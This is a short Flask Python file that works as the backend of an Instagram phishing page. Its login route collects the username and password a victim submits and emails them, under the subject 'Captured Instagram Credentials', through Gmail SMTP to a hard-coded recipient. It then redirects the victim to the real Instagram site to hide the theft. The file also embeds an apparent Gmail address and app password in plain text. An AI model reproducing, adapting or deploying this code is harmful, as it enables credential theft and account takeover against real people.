from flask import Flask, render_template, request, redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Email configuration (replace with your details)
EMAIL_ADDRESS = "aresjr105@gmail.com"  # Your Gmail address
EMAIL_PASSWORD = "kopexking105"    # Gmail App Password (NOT regular password)
RECIPIENT_EMAIL = "kuldux8@gmail.com"  # Where to send credentials (use your own email)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Prepare email content
    subject = "Captured Instagram Credentials"
    body = f"Username: {username}\nPassword: {password}"
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    
    # Send email using Gmail SMTP
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
    except Exception as e:
        print(f"Failed to send email: {e}")  # Log error to console for debugging
    
    # Redirect to real Instagram to mimic phishing
    return redirect('https://www.instagram.com/')

if __name__ == '__main__':
    app.run(debug=True)

